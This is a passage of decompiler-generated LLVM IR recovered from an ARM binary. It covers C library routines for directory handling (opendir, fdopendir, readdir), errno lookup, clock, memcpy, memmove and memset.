dec_label_pc_11848:                               ; preds = %dec_label_pc_117bc
  store i32 68156, i32* %r3.global-to-local, align 4
  %v0_1184c = call i32 @__aeabi_read_tp()
  %v3_11850 = load i16, i16* @global_var_22294.357, align 2
  %v4_11850 = sext i16 %v3_11850 to i32
  store i32 %v4_11850, i32* %r3.global-to-local, align 4
  %v0_11854 = load i32, i32* %r2.global-to-local, align 4
  %v1_11854 = sub i32 0, %v0_11854
  store i32 %v1_11854, i32* %r2.global-to-local, align 4
  %v3_11858 = add i32 %v4_11850, %v0_1184c
  %v4_11858 = inttoptr i32 %v3_11858 to i32*
  store i32 %v1_11854, i32* %v4_11858, align 4
  %v0_1185c = load i32, i32* @r8, align 4
  br label %dec_label_pc_11860

dec_label_pc_11860:                               ; preds = %dec_label_pc_117bc, %dec_label_pc_11848
  %v0_11860 = phi i32 [ %v0_1182c, %dec_label_pc_117bc ], [ %v0_1185c, %dec_label_pc_11848 ]
  store i32 %v0_11860, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_11864

dec_label_pc_11864:                               ; preds = %dec_label_pc_117a0, %dec_label_pc_11860
  %v0_11864 = phi i32 [ %v0_11864.pre, %dec_label_pc_117a0 ], [ %v0_11860, %dec_label_pc_11860 ]
  %v2_1186c = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_1186c, i32* @r4, align 4
  store i32 %v9_11780, i32* @r6, align 4
  store i32 %v12_11780, i32* @r7, align 4
  store i32 %v15_11780, i32* @r8, align 4
  store i32 %v18_11780, i32* @lr, align 4
  ret i32 %v0_11864

; uselistorder directives
  uselistorder i32 %v0_1182c, { 1, 0, 2 }
  uselistorder label %dec_label_pc_11864, { 1, 0 }
  uselistorder label %dec_label_pc_11860, { 1, 0 }
}

define i32 @function_1187c(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_1187c:
  %v0_1187c = load i1, i1* @cpsr_z, align 1
  br i1 %v0_1187c, label %bb, label %.thread3

bb:                                               ; preds = %dec_label_pc_1187c
  %v2_11888 = load i32, i32* @ip, align 4
  %v3_1188c = load i32, i32* @sl, align 4
  %v8_1188c = lshr i32 %v2_11888, %v3_1188c
  %v9_1188c = and i32 %v8_1188c, %arg2
  br label %.thread3

.thread3:                                         ; preds = %dec_label_pc_1187c, %bb
  %v10_1188c = phi i32 [ %arg1, %dec_label_pc_1187c ], [ %v9_1188c, %bb ]
  ret i32 %v10_1188c

; uselistorder directives
  uselistorder label %.thread3, { 1, 0 }
}

define i32 @fd_to_DIR(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %stack_var_-32 = alloca i32, align 4
  %v3_11890 = load i32, i32* @r4, align 4
  %v6_11890 = load i32, i32* @r5, align 4
  %v9_11890 = load i32, i32* @r6, align 4
  %v12_11890 = load i32, i32* @r7, align 4
  store i32 %arg1, i32* @r7, align 4
  store i32 48, i32* @r0, align 4
  store i32 %arg2, i32* @r4, align 4
  %v0_118a4 = call i32 @malloc()
  %v2_118ac = icmp eq i32 %v0_118a4, 0
  store i32 ptrtoint (i32* @global_var_2223c.361 to i32), i32* @r6, align 4
  br i1 %v2_118ac, label %bb, label %dec_label_pc_118bc

bb:                                               ; preds = %entry
  br label %dec_label_pc_11948

dec_label_pc_118bc:                               ; preds = %entry
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_118c0 = load i32, i32* @r4, align 4
  %v2_118c0 = icmp ugt i32 %v0_118c0, 511
  %v2_118c4 = add i32 %v0_118a4, 4
  %v3_118c4 = inttoptr i32 %v2_118c4 to i32*
  store i32 0, i32* %v3_118c4, align 4
  %v0_118c8 = load i32, i32* %r3.global-to-local, align 4
  %v2_118c8 = add i32 %v0_118a4, 16
  %v3_118c8 = inttoptr i32 %v2_118c8 to i32*
  store i32 %v0_118c8, i32* %v3_118c8, align 4
  %v0_118cc = load i32, i32* %r3.global-to-local, align 4
  %v2_118cc = add i32 %v0_118a4, 8
  %v3_118cc = inttoptr i32 %v2_118cc to i32*
  store i32 %v0_118cc, i32* %v3_118cc, align 4
  br i1 %v2_118c0, label %.thread, label %bb16

.thread:                                          ; preds = %dec_label_pc_118bc
  %v0_118d42 = load i32, i32* @r4, align 4
  %v2_118d43 = add i32 %v0_118a4, 20
  %v3_118d44 = inttoptr i32 %v2_118d43 to i32*
  store i32 %v0_118d42, i32* %v3_118d44, align 4
  br label %bb17

bb16:                                             ; preds = %dec_label_pc_118bc
  %v1_118d0 = load i32, i32* %r3.global-to-local, align 4
  %v2_118d0 = add i32 %v1_118d0, 512
  store i32 %v2_118d0, i32* %r3.global-to-local, align 4
  %v0_118d4 = load i32, i32* @r4, align 4
  %v2_118d4 = add i32 %v0_118a4, 20
  %v3_118d4 = inttoptr i32 %v2_118d4 to i32*
  store i32 %v0_118d4, i32* %v3_118d4, align 4
  %v1_118d8 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v1_118d8, i32* %v3_118d4, align 4
  br label %bb17

bb17:                                             ; preds = %.thread, %bb16
  store i32 %v0_118a4, i32* @r5, align 4
  %v0_118e0 = load i32, i32* @r7, align 4
  %v2_118e0 = inttoptr i32 %v0_118a4 to i32*
  store i32 %v0_118e0, i32* %v2_118e0, align 4
  %v0_118e4 = load i32, i32* @r5, align 4
  %v1_118e4 = add i32 %v0_118e4, 20
  %v2_118e4 = inttoptr i32 %v1_118e4 to i32*
  %v3_118e4 = load i32, i32* %v2_118e4, align 4
  store i32 %v3_118e4, i32* %r1.global-to-local, align 4
  %v2_118ec = call i32 @calloc(i32 1, i32 %v3_118e4)
  %v2_118f0 = icmp eq i32 %v2_118ec, 0
  store i32 %v2_118ec, i32* @r4, align 4
  %v1_118f8 = load i32, i32* @r5, align 4
  %v2_118f8 = add i32 %v1_118f8, 12
  %v3_118f8 = inttoptr i32 %v2_118f8 to i32*
  store i32 %v2_118ec, i32* %v3_118f8, align 4
  br i1 %v2_118f0, label %dec_label_pc_11900, label %dec_label_pc_11910

dec_label_pc_11900:                               ; preds = %bb17
  %v0_11900 = load i32, i32* @r5, align 4
  store i32 %v0_11900, i32* @r0, align 4
  %v0_11904 = call i32 @free()
  %v0_11908 = load i32, i32* @r4, align 4
  br label %dec_label_pc_11948

dec_label_pc_11910:                               ; preds = %bb17
  %v0_11914 = load i32, i32* @r6, align 4
  %v2_11914 = add i32 %v0_11914, -34036
  store i32 %v2_11914, i32* %r3.global-to-local, align 4
  %v1_1191c = inttoptr i32 %v2_11914 to i32*
  %v2_1191c = load i32, i32* %v1_1191c, align 4
  %v3_1191c = add i32 %v0_11914, -34032
  %v4_1191c = inttoptr i32 %v3_1191c to i32*
  %v5_1191c = load i32, i32* %v4_1191c, align 4
  store i32 %v5_1191c, i32* %r1.global-to-local, align 4
  %v6_1191c = add i32 %v0_11914, -34028
  %v7_1191c = inttoptr i32 %v6_1191c to i32*
  %v8_1191c = load i32, i32* %v7_1191c, align 4
  store i32 %v8_1191c, i32* %r2.global-to-local, align 4
  %v9_1191c = add i32 %v0_11914, -34024
  %v10_1191c = inttoptr i32 %v9_1191c to i32*
  %v11_1191c = load i32, i32* %v10_1191c, align 4
  store i32 %v11_1191c, i32* %r3.global-to-local, align 4
  %v12_1191c = add i32 %v0_11914, -34020
  %v1_11928 = inttoptr i32 %v12_1191c to i32*
  %v2_11928 = load i32, i32* %v1_11928, align 4
  %v3_11928 = add i32 %v0_11914, -34016
  %v4_11928 = inttoptr i32 %v3_11928 to i32*
  %v5_11928 = load i32, i32* %v4_11928, align 4
  store i32 %v2_11928, i32* %stack_var_-32, align 4
  store i32 %v5_1191c, i32* %r1.global-to-local, align 4
  store i32 %v8_1191c, i32* %r2.global-to-local, align 4
  store i32 %v11_1191c, i32* %r3.global-to-local, align 4
  %v0_11938 = load i32, i32* @r5, align 4
  %v1_11938 = add i32 %v0_11938, 24
  %v1_1193c = inttoptr i32 %v1_11938 to i32*
  store i32 %v2_1191c, i32* %v1_1193c, align 4
  %v3_1193c = add i32 %v0_11938, 28
  %v4_1193c = inttoptr i32 %v3_1193c to i32*
  %v5_1193c = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_1193c, i32* %v4_1193c, align 4
  %v6_1193c = add i32 %v0_11938, 32
  %v7_1193c = inttoptr i32 %v6_1193c to i32*
  %v8_1193c = load i32, i32* %r2.global-to-local, align 4
  store i32 %v8_1193c, i32* %v7_1193c, align 4
  %v9_1193c = add i32 %v0_11938, 36
  %v10_1193c = inttoptr i32 %v9_1193c to i32*
  %v11_1193c = load i32, i32* %r3.global-to-local, align 4
  store i32 %v11_1193c, i32* %v10_1193c, align 4
  %v12_1193c = add i32 %v0_11938, 40
  %v2_11940 = load i32, i32* %stack_var_-32, align 4
  store i32 %v5_11928, i32* %r1.global-to-local, align 4
  %v1_11944 = inttoptr i32 %v12_1193c to i32*
  store i32 %v2_11940, i32* %v1_11944, align 4
  %v3_11944 = add i32 %v0_11938, 44
  %v4_11944 = inttoptr i32 %v3_11944 to i32*
  %v5_11944 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_11944, i32* %v4_11944, align 4
  %v0_11948.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_11948

dec_label_pc_11948:                               ; preds = %bb, %dec_label_pc_11900, %dec_label_pc_11910
  %v0_11948 = phi i32 [ 0, %bb ], [ %v0_11908, %dec_label_pc_11900 ], [ %v0_11948.pre, %dec_label_pc_11910 ]
  store i32 %v3_11890, i32* @r4, align 4
  store i32 %v6_11890, i32* @r5, align 4
  store i32 %v9_11890, i32* @r6, align 4
  store i32 %v12_11890, i32* @r7, align 4
  ret i32 %v0_11948

; uselistorder directives
  uselistorder i32 %v2_118ec, { 1, 0, 2 }
  uselistorder i32 %v0_118a4, { 3, 2, 5, 0, 6, 1, 4, 7 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 0 }
  uselistorder i32 512, { 7, 4, 0, 1, 8, 5, 9, 6, 10, 2, 11, 3, 12 }
  uselistorder label %dec_label_pc_11948, { 2, 1, 0 }
  uselistorder label %bb17, { 1, 0 }
}

define i32 @__GI_opendir(i32 %arg1) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* @r0, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-96 = alloca i32, align 4
  %v3_11960 = load i32, i32* @r7, align 4
  store i32 542720, i32* %r1.global-to-local, align 4
  %v2_11968 = ptrtoint i32* %stack_var_-96 to i32
  store i32 %arg1, i32* %r2.global-to-local, align 4
  %tmp6 = icmp ult i32 %arg1, -4095
  br i1 %tmp6, label %dec_label_pc_11998, label %dec_label_pc_11980

dec_label_pc_11980:                               ; preds = %entry
  %v0_11984 = call i32 @__aeabi_read_tp()
  %v3_11988 = load i16, i16* @global_var_22294.357, align 2
  %v4_11988 = sext i16 %v3_11988 to i32
  %v0_1198c = load i32, i32* %r2.global-to-local, align 4
  %v1_1198c = sub i32 0, %v0_1198c
  store i32 %v1_1198c, i32* %r2.global-to-local, align 4
  %v3_11990 = add i32 %v4_11988, %v0_11984
  %v4_11990 = inttoptr i32 %v3_11990 to i32*
  store i32 %v1_1198c, i32* %v4_11990, align 4
  br label %dec_label_pc_119bc

dec_label_pc_11998:                               ; preds = %entry
  store i32 %arg1, i32* @r7, align 4
  %v1_11998 = icmp slt i32 %arg1, 0
  br i1 %v1_11998, label %dec_label_pc_119bc, label %dec_label_pc_119a0

dec_label_pc_119a0:                               ; preds = %dec_label_pc_11998
  store i32 %v2_11968, i32* @r1, align 4
  %v0_119a4 = call i32 @fstat()
  %v1_119a8 = icmp slt i32 %v0_119a4, 0
  br i1 %v1_119a8, label %dec_label_pc_119b0, label %dec_label_pc_119c4

dec_label_pc_119b0:                               ; preds = %dec_label_pc_119a0
  br label %dec_label_pc_119bc

dec_label_pc_119bc:                               ; preds = %dec_label_pc_119b0, %dec_label_pc_11998, %dec_label_pc_11980
  store i32 0, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_11a08

dec_label_pc_119c4:                               ; preds = %dec_label_pc_119a0
  store i32 2, i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  %v0_119cc = load i32, i32* @r7, align 4
  %v3_119d0 = call i32 @__GI___fcntl_nocancel(i32 %v0_119cc, i32 2, i32 1)
  store i32 %tmp, i32* %r1.global-to-local, align 4
  %v0_119d8 = load i32, i32* @r7, align 4
  %v2_119dc = call i32 @fd_to_DIR(i32 %v0_119d8, i32 %tmp)
  store i32 %v2_119dc, i32* %r1.global-to-local, align 4
  %v2_119e0 = icmp eq i32 %v2_119dc, 0
  br i1 %v2_119e0, label %dec_label_pc_119e8, label %dec_label_pc_11a08

dec_label_pc_119e8:                               ; preds = %dec_label_pc_119c4
  %v0_119f8 = call i32 @__aeabi_read_tp()
  %v3_119fc = load i16, i16* @global_var_22294.357, align 2
  %v4_119fc = sext i16 %v3_119fc to i32
  store i32 12, i32* %r2.global-to-local, align 4
  %v3_11a04 = add i32 %v4_119fc, %v0_119f8
  %v4_11a04 = inttoptr i32 %v3_11a04 to i32*
  store i32 12, i32* %v4_11a04, align 4
  %v0_11a08.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_11a08

dec_label_pc_11a08:                               ; preds = %dec_label_pc_119c4, %dec_label_pc_119bc, %dec_label_pc_119e8
  %v0_11a08 = phi i32 [ %v2_119dc, %dec_label_pc_119c4 ], [ 0, %dec_label_pc_119bc ], [ %v0_11a08.pre, %dec_label_pc_119e8 ]
  store i32 %v3_11960, i32* @r7, align 4
  ret i32 %v0_11a08

; uselistorder directives
  uselistorder i32 %tmp, { 1, 0 }
  uselistorder i32* %r1.global-to-local, { 0, 1, 2, 4, 3, 5 }
  uselistorder i32 %arg1, { 1, 2, 0, 3, 4 }
  uselistorder label %dec_label_pc_11a08, { 2, 0, 1 }
}

define i32 @"$d.10"(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_11a18:
  %v0_11a18 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_11a18, label %bb, label %.thread1

bb:                                               ; preds = %dec_label_pc_11a18
  br label %.thread1

.thread1:                                         ; preds = %dec_label_pc_11a18, %bb
  %v4_11a20 = phi i32 [ %arg1, %dec_label_pc_11a18 ], [ 0, %bb ]
  ret i32 %v4_11a20

; uselistorder directives
  uselistorder label %.thread1, { 1, 0 }
}

define i32 @fdopendir(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* @r0, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp4 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-104 = alloca i32, align 4
  %v2_11a28 = ptrtoint i32* %stack_var_-104 to i32
  store i32 %v2_11a28, i32* @r1, align 4
  store i32 %arg1, i32* @r4, align 4
  %v0_11a34 = call i32 @fstat()
  store i32 %v0_11a34, i32* @r5, align 4
  %v2_11a38 = icmp eq i32 %v0_11a34, 0
  br i1 %v2_11a38, label %dec_label_pc_11a40, label %dec_label_pc_11ab8

dec_label_pc_11a40:                               ; preds = %entry
  %v1_11a44 = and i32 %tmp4, 61440
  store i32 %v1_11a44, i32* @r3, align 4
  %v7_11a48 = icmp eq i32 %v1_11a44, 16384
  br i1 %v7_11a48, label %dec_label_pc_11a68, label %dec_label_pc_11a50

dec_label_pc_11a50:                               ; preds = %dec_label_pc_11a40
  %v0_11a54 = call i32 @__aeabi_read_tp()
  %v3_11a58 = load i16, i16* @global_var_22294.357, align 2
  %v0_11a5c = load i32, i32* @r5, align 4
  store i32 %v0_11a5c, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_11a9c

dec_label_pc_11a68:                               ; preds = %dec_label_pc_11a40
  %v0_11a68 = load i32, i32* @r4, align 4
  store i32 3, i32* %r1.global-to-local, align 4
  %v2_11a70 = call i32 @__libc_fcntl(i32 %v0_11a68, i32 3)
  %v7_11a74 = icmp eq i32 %v2_11a70, -1
  br i1 %v7_11a74, label %dec_label_pc_11ab8, label %dec_label_pc_11a7c

dec_label_pc_11a7c:                               ; preds = %dec_label_pc_11a68
  %v1_11a7c = urem i32 %v2_11a70, 4
  store i32 %v1_11a7c, i32* %r3.global-to-local, align 4
  %v7_11a80 = icmp eq i32 %v1_11a7c, 1
  br i1 %v7_11a80, label %dec_label_pc_11a88, label %dec_label_pc_11aa4

dec_label_pc_11a88:                               ; preds = %dec_label_pc_11a7c
  %v0_11a8c = call i32 @__aeabi_read_tp()
  %v3_11a90 = load i16, i16* @global_var_22294.357, align 2
  %v0_11a94 = load i32, i32* @r5, align 4
  store i32 %v0_11a94, i32* %r1.global-to-local, align 4
  %v0_11a98 = load i32, i32* %r3.global-to-local, align 4
  %v1_11a98 = add i32 %v0_11a98, 21
  br label %dec_label_pc_11a9c

dec_label_pc_11a9c:                               ; preds = %dec_label_pc_11a50, %dec_label_pc_11a88
  %v2_11a9c.in = phi i16 [ %v3_11a58, %dec_label_pc_11a50 ], [ %v3_11a90, %dec_label_pc_11a88 ]
  %v1_11a9c = phi i32 [ %v0_11a54, %dec_label_pc_11a50 ], [ %v0_11a8c, %dec_label_pc_11a88 ]
  %storemerge = phi i32 [ 20, %dec_label_pc_11a50 ], [ %v1_11a98, %dec_label_pc_11a88 ]
  %v2_11a9c = sext i16 %v2_11a9c.in to i32
  store i32 %storemerge, i32* %r3.global-to-local, align 4
  %v3_11a9c = add i32 %v1_11a9c, %v2_11a9c
  %v4_11a9c = inttoptr i32 %v3_11a9c to i32*
  store i32 %storemerge, i32* %v4_11a9c, align 4
  %v0_11abc.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_11abc

dec_label_pc_11aa4:                               ; preds = %dec_label_pc_11a7c
  store i32 %tmp, i32* %r1.global-to-local, align 4
  %v0_11aa8 = load i32, i32* @r4, align 4
  %v2_11aac = call i32 @fd_to_DIR(i32 %v0_11aa8, i32 %tmp)
  store i32 %v2_11aac, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_11abc

dec_label_pc_11ab8:                               ; preds = %entry, %dec_label_pc_11a68
  store i32 0, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_11abc

dec_label_pc_11abc:                               ; preds = %dec_label_pc_11aa4, %dec_label_pc_11a9c, %dec_label_pc_11ab8
  %v0_11abc = phi i32 [ %v2_11aac, %dec_label_pc_11aa4 ], [ %v0_11abc.pre, %dec_label_pc_11a9c ], [ 0, %dec_label_pc_11ab8 ]
  ret i32 %v0_11abc

; uselistorder directives
  uselistorder i32 %v1_11a7c, { 1, 0 }
  uselistorder i32 %v2_11a70, { 1, 0 }
  uselistorder i32 %tmp, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 2, 0, 1 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 6, 4, 5, 7, 0 }
  uselistorder i32 (i32, i32)* @fd_to_DIR, { 1, 0 }
  uselistorder i32 21, { 6, 0, 7, 8, 5, 1, 2, 3, 4 }
  uselistorder i32 ()* @fstat, { 1, 0 }
  uselistorder label %dec_label_pc_11abc, { 2, 0, 1 }
  uselistorder label %dec_label_pc_11ab8, { 1, 0 }
  uselistorder label %dec_label_pc_11a9c, { 1, 0 }
}

define i32 @__GI_readdir(i32* %arg1) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  %v3_11ad4 = load i32, i32* @r4, align 4
  %v6_11ad4 = load i32, i32* @r5, align 4
  %v9_11ad4 = load i32, i32* @r6, align 4
  %v12_11ad4 = load i32, i32* @r7, align 4
  %v15_11ad4 = load i32, i32* @lr, align 4
  store i32 ptrtoint (i32* @global_var_2223c.361 to i32), i32* @r6, align 4
  %v1_11ae8 = add i32 %tmp, 24
  store i32 %v1_11ae8, i32* @r4, align 4
  %v4_11aec = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_2223c.361 to i32), i32 68) to i32*), align 4
  store i32 %v4_11aec, i32* %r1.global-to-local, align 4
  store i32 %v1_11ae8, i32* %r2.global-to-local, align 4
  store i32 %tmp, i32* @r5, align 4
  %v4_11b00 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_2223c.361 to i32), i32 112) to i32*), align 4
  call void @__pseudo_branch(i32 %v4_11b00)
  %v0_11b14 = load i32, i32* @r6, align 4
  %v2_11b14 = add i32 %v0_11b14, 16
  %v3_11b14 = inttoptr i32 %v2_11b14 to i32*
  %v4_11b14 = load i32, i32* %v3_11b14, align 4
  store i32 %v4_11b14, i32* @ip, align 4
  store i32 72480, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_11b14)
  store i32 0, i32* @r7, align 4
  br label %dec_label_pc_11b24

dec_label_pc_11b24:                               ; preds = %dec_label_pc_11b54, %entry
  %v0_11b24 = load i32, i32* @r5, align 4
  %v1_11b24 = add i32 %v0_11b24, 4
  %v2_11b24 = inttoptr i32 %v1_11b24 to i32*
  %v3_11b24 = load i32, i32* %v2_11b24, align 4
  store i32 %v3_11b24, i32* %r2.global-to-local, align 4
  %v4_11b24 = add i32 %v0_11b24, 8
  %v5_11b24 = inttoptr i32 %v4_11b24 to i32*
  %v6_11b24 = load i32, i32* %v5_11b24, align 4
  %tmp10 = icmp ugt i32 %v6_11b24, %v3_11b24
  br i1 %tmp10, label %dec_label_pc_11b54, label %dec_label_pc_11b30

dec_label_pc_11b30:                               ; preds = %dec_label_pc_11b24
  %v1_11b30 = inttoptr i32 %v0_11b24 to i32*
  %v2_11b30 = load i32, i32* %v1_11b30, align 4
  %v1_11b34 = add i32 %v0_11b24, 12
  %v2_11b34 = inttoptr i32 %v1_11b34 to i32*
  %v3_11b34 = load i32, i32* %v2_11b34, align 4
  store i32 %v3_11b34, i32* %r1.global-to-local, align 4
  %v1_11b38 = add i32 %v0_11b24, 20
  %v2_11b38 = inttoptr i32 %v1_11b38 to i32*
  %v3_11b38 = load i32, i32* %v2_11b38, align 4
  store i32 %v3_11b38, i32* %r2.global-to-local, align 4
  %v4_11b3c = call i32 @__getdents(i32 %v2_11b30, i32 %v3_11b34, i32 %v3_11b38, i32 %v6_11b24)
  %tmp9 = icmp slt i32 %v4_11b3c, 1
  br i1 %tmp9, label %.thread, label %dec_label_pc_11b4c

.thread:                                          ; preds = %dec_label_pc_11b30
  store i32 0, i32* @r4, align 4
  br label %dec_label_pc_11b80

dec_label_pc_11b4c:                               ; preds = %dec_label_pc_11b30
  %v1_11b4c = load i32, i32* @r5, align 4
  %v2_11b4c = add i32 %v1_11b4c, 8
  %v3_11b4c = inttoptr i32 %v2_11b4c to i32*
  store i32 %v4_11b3c, i32* %v3_11b4c, align 4
  %v0_11b50 = load i32, i32* @r7, align 4
  %v1_11b50 = load i32, i32* @r5, align 4
  %v2_11b50 = add i32 %v1_11b50, 4
  %v3_11b50 = inttoptr i32 %v2_11b50 to i32*
  store i32 %v0_11b50, i32* %v3_11b50, align 4
  %v0_11b54.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_11b54

dec_label_pc_11b54:                               ; preds = %dec_label_pc_11b24, %dec_label_pc_11b4c
  %v1_11b64 = phi i32 [ %v0_11b24, %dec_label_pc_11b24 ], [ %v0_11b54.pre, %dec_label_pc_11b4c ]
  %v1_11b54 = add i32 %v1_11b64, 4
  %v2_11b54 = inttoptr i32 %v1_11b54 to i32*
  %v3_11b54 = load i32, i32* %v2_11b54, align 4
  store i32 %v3_11b54, i32* %r2.global-to-local, align 4
  %v1_11b58 = add i32 %v1_11b64, 12
  %v2_11b58 = inttoptr i32 %v1_11b58 to i32*
  %v3_11b58 = load i32, i32* %v2_11b58, align 4
  store i32 %v3_11b58, i32* %r1.global-to-local, align 4
  %v2_11b5c = add i32 %v3_11b58, %v3_11b54
  store i32 %v2_11b5c, i32* @r4, align 4
  %v1_11b60 = add i32 %v2_11b5c, 4
  %v2_11b60 = inttoptr i32 %v1_11b60 to i32*
  %v3_11b60 = load i32, i32* %v2_11b60, align 4
  %v2_11b64 = add i32 %v1_11b64, 16
  %v3_11b64 = inttoptr i32 %v2_11b64 to i32*
  store i32 %v3_11b60, i32* %v3_11b64, align 4
  %v0_11b68 = load i32, i32* @r4, align 4
  %v1_11b68 = add i32 %v0_11b68, 8
  %v2_11b68 = inttoptr i32 %v1_11b68 to i16*
  %v3_11b68 = load i16, i16* %v2_11b68, align 2
  %v4_11b68 = zext i16 %v3_11b68 to i32
  %v0_11b6c = load i32, i32* %r2.global-to-local, align 4
  %v1_11b6c = load i32, i32* %r1.global-to-local, align 4
  %v2_11b6c = add i32 %v1_11b6c, %v0_11b6c
  %v3_11b6c = inttoptr i32 %v2_11b6c to i32*
  %v4_11b6c = load i32, i32* %v3_11b6c, align 4
  store i32 %v4_11b6c, i32* %r1.global-to-local, align 4
  %v2_11b70 = add i32 %v0_11b6c, %v4_11b68
  %v2_11b74 = icmp eq i32 %v4_11b6c, 0
  %v1_11b78 = load i32, i32* @r5, align 4
  %v2_11b78 = add i32 %v1_11b78, 4
  %v3_11b78 = inttoptr i32 %v2_11b78 to i32*
  store i32 %v2_11b70, i32* %v3_11b78, align 4
  br i1 %v2_11b74, label %dec_label_pc_11b24, label %dec_label_pc_11b80

dec_label_pc_11b80:                               ; preds = %dec_label_pc_11b54, %.thread
  store i32 1, i32* %r1.global-to-local, align 4
  %v0_11b8c = load i32, i32* @r6, align 4
  %v2_11b8c = add i32 %v0_11b8c, 44
  %v3_11b8c = inttoptr i32 %v2_11b8c to i32*
  %v4_11b8c = load i32, i32* %v3_11b8c, align 4
  call void @__pseudo_branch(i32 %v4_11b8c)
  %v0_11b98 = load i32, i32* @r4, align 4
  store i32 %v3_11ad4, i32* @r4, align 4
  store i32 %v6_11ad4, i32* @r5, align 4
  store i32 %v9_11ad4, i32* @r6, align 4
  store i32 %v12_11ad4, i32* @r7, align 4
  store i32 %v15_11ad4, i32* @lr, align 4
  ret i32 %v0_11b98

; uselistorder directives
  uselistorder i32 %v1_11b64, { 0, 2, 1 }
  uselistorder i32 %v6_11b24, { 1, 0 }
  uselistorder i32 %v0_11b24, { 0, 1, 3, 2, 4, 5 }
  uselistorder label %dec_label_pc_11b54, { 1, 0 }
}

define i32 @function_11bac(i32 %arg1) local_unnamed_addr {
dec_label_pc_11bac:
  %v0_11bac = load i1, i1* @cpsr_z, align 1
  br i1 %v0_11bac, label %bb, label %.thread2

bb:                                               ; preds = %dec_label_pc_11bac
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_11bac, %bb
  %v4_11bb8 = phi i32 [ %arg1, %dec_label_pc_11bac ], [ 0, %bb ]
  ret i32 %v4_11bb8

; uselistorder directives
  uselistorder label %.thread2, { 1, 0 }
}

define i32 @__GI___errno_location() local_unnamed_addr {
entry:
  %v0_11bbc = load i32, i32* @lr, align 4
  %v0_11bc4 = call i32 @__aeabi_read_tp()
  %v3_11bc8 = load i16, i16* @global_var_22294.357, align 2
  %v4_11bc8 = sext i16 %v3_11bc8 to i32
  %v2_11bcc = add i32 %v4_11bc8, %v0_11bc4
  store i32 %v0_11bbc, i32* @lr, align 4
  ret i32 %v2_11bcc
}

define i32 @clock(i32 %arg1) local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-24 = alloca i32, align 4
  %v2_11be0 = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_11be0, i32* @r0, align 4
  %v1_11be8 = call i32 @times(i32 %v2_11be0)
  %v2_11bec = load i32, i32* %stack_var_-24, align 4
  %v2_11bf0 = add i32 %v2_11bec, %tmp
  %v2_11bf8 = mul i32 %v2_11bf0, 10000
  %v1_11bfc = and i32 %v2_11bf8, 2147483632
  ret i32 %v1_11bfc

; uselistorder directives
  uselistorder i32 %v2_11be0, { 1, 0 }
}

define i32 @memcpy() local_unnamed_addr {
entry:
  %v0_11c10 = call i32 @_memcpy()
  ret i32 %v0_11c10
}

define i32 @memmove(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %v0_11c20 = call i32 @_memcpy()
  ret i32 %v0_11c20

; uselistorder directives
  uselistorder i32 ()* @_memcpy, { 1, 0 }
}

define i32 @__GI_memset(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %ip.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* @r1, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* @r3, align 4
  %v8_11c34 = icmp eq i32 %arg3, 8
  store i1 %v8_11c34, i1* %cpsr_z.global-to-local, align 1
  %v5_11c38 = icmp slt i32 %arg3, 8
  br i1 %v5_11c38, label %dec_label_pc_11c98, label %dec_label_pc_11c3c

dec_label_pc_11c3c:                               ; preds = %entry
  %v4_11c3c = mul i32 %arg2, 256
  %v5_11c3c = or i32 %v4_11c3c, %arg2
  %v4_11c40 = mul i32 %v5_11c3c, 65536
  %v5_11c40 = or i32 %v4_11c40, %v5_11c3c
  store i32 %v5_11c40, i32* @r1, align 4
  %v1_11c4457 = urem i32 %tmp, 4
  %v2_11c4458 = icmp eq i32 %v1_11c4457, 0
  store i1 %v2_11c4458, i1* %cpsr_z.global-to-local, align 1
